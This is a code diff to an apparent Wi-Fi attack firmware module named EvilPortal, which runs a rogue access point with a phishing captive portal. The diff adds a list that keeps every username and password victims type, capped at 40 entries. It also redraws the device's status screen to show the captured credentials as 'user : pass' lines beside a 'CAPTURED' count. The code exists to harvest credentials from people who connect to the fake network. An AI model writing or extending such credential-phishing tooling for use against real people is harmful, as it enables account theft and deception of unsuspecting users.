@@ -129,6 +129,7 @@ void EvilPortal::setup() {
   this->has_ap = false;
 
   html_files = new LinkedList<String>();
+  if (captured_creds == nullptr) captured_creds = new LinkedList<String>();
 
   #ifdef HAS_SD
     if (sd_obj.supported) {
@@ -496,6 +497,7 @@ void EvilPortal::startPortal() {
   // Reset the live status HUD for this portal session.
   this->num_creds = 0;
   this->last_cred = "";
+  if (this->captured_creds != nullptr) this->captured_creds->clear();
   this->portal_start_ms = millis();
   this->portal_ui_ms = 0;
   this->portal_needs_clear = true;
@@ -550,8 +552,13 @@ void EvilPortal::main(uint8_t scan_mode) {
     buffer_obj.append(line);
 
     // Feed the live status HUD instead of scrolling a console line over it.
-    // user_name / password already hold the just-captured values.
+    // user_name / password already hold the just-captured values. Append to the
+    // on-screen list (newest last) and cap it so memory stays bounded.
     this->num_creds++;
+    if (this->captured_creds != nullptr) {
+      this->captured_creds->add(this->user_name + " : " + this->password);
+      while (this->captured_creds->size() > 40) this->captured_creds->remove(0);
+    }
   }
 
   #ifdef HAS_SCREEN
@@ -573,9 +580,9 @@ void EvilPortal::drawPortalStatus() {
   const int W = display_obj.tft.width();
   const int H = display_obj.tft.height();
   #ifdef HAS_MINI_SCREEN
-    const int pad = 2, barH = 13, lh = 11, bigFont = 2;
+    const int pad = 2, barH = 13, lh = 11;
   #else
-    const int pad = 5, barH = 18, lh = 16, bigFont = 4;
+    const int pad = 5, barH = 18, lh = 16;
   #endif
   const int topY = 16;
   const uint16_t accent = TFT_ORANGE;
@@ -609,23 +616,7 @@ void EvilPortal::drawPortalStatus() {
   line(String("SSID: ") + apName, TFT_WHITE, y); y += lh;
   line(String("Page: ") + this->target_html_name, TFT_CYAN, y); y += lh;
 
-  y += 2;
-  display_obj.tft.drawFastHLine(pad, y, W - 2 * pad, TFT_DARKGREY);
-  y += pad + 2;
-
-  // Big captured-credential count.
-  display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
-  display_obj.tft.drawString(String(this->num_creds) + " ", pad, y, bigFont);
-  int bigH = display_obj.tft.fontHeight(bigFont);
-  #ifndef HAS_MINI_SCREEN
-    display_obj.tft.setTextColor(TFT_LIGHTGREY, TFT_BLACK);
-    display_obj.tft.drawString("CAPTURED", pad, y + bigH, 1);
-    y += bigH + lh + 2;
-  #else
-    y += bigH + 2;
-  #endif
-
-  // Clients (mini) + elapsed.
+  // Clients + elapsed on one line.
   const uint32_t elapsed = (now - this->portal_start_ms) / 1000;
   char et[12];
   snprintf(et, sizeof(et), "%02lu:%02lu",
@@ -641,10 +632,22 @@ void EvilPortal::drawPortalStatus() {
   display_obj.tft.setTextDatum(TL_DATUM);
   y += lh;
 
-  // Last captured credential (what the victim typed).
-  if (this->num_creds > 0) {
-    line(String("user: ") + this->user_name, TFT_CYAN, y); y += lh;
-    line(String("pass: ") + this->password, TFT_WHITE, y); y += lh;
+  // Divider + captured-credentials header.
+  y += 2;
+  display_obj.tft.drawFastHLine(pad, y, W - 2 * pad, TFT_DARKGREY);
+  y += pad + 2;
+  line(String("CAPTURED: ") + this->num_creds, TFT_GREEN, y); y += lh;
+
+  // Accumulating list of every captured credential ("user : pass"), newest at
+  // the top, as many as fit on the screen. The full history is in the SD log;
+  // once the list outgrows the screen the oldest scroll off the bottom.
+  if (this->captured_creds != nullptr) {
+    const int maxY = H - lh;
+    for (int i = this->captured_creds->size() - 1; i >= 0 && y <= maxY; i--) {
+      bool newest = (i == this->captured_creds->size() - 1);
+      line(this->captured_creds->get(i), newest ? TFT_WHITE : TFT_LIGHTGREY, y);
+      y += lh;
+    }
   }
 }
 #endif
